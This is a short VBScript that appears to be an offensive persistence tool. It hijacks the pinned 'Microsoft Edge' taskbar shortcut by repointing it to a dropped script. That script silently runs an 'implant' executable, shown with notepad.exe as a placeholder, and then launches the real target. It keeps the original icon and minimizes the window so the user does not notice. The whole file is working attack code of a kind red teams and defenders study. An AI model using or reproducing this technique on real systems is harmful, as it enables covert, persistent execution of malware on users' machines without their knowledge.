implant = "C:\Windows\system32\notepad.exe"
' change username + path
newTarget = "C:\Users\aslam\Desktop\xmxedge2.vbs"
lnkName = "Microsoft Edge.lnk"

' targets the taskbar
Set WshShell = WScript.CreateObject("WScript.Shell")
taskbarPath = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\"
fullLnkPath = taskbarPath & lnkName

set oShellLink = WshShell.CreateShortcut(fullLnkPath)

' Preserve original shortcut properties
origTarget = oShellLink.TargetPath
origArgs = oShellLink.Arguments
origIcon = oShellLink.IconLocation
origDir = oShellLink.WorkingDirectory

' lnk mods
Set FSO = CreateObject("Scripting.FileSystemObject")
Set File = FSO.CreateTextFile(newTarget, True)
File.Write "Set oShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
File.Write "oShell.Run " & chr(34) & implant & chr(34) & vbCrLf
File.Write "oShell.Run """"" & chr(34) & oShellLink.TargetPath & """"" " & oShellLink.Arguments & chr(34) & vbCrLf
File.Close

' Hijack shortcut
oShellLink.TargetPath = newTarget
oShellLink.IconLocation = origIcon
oShellLink.WorkingDirectory = origDir
oShellLink.WindowStyle = 7
oShellLink.Save
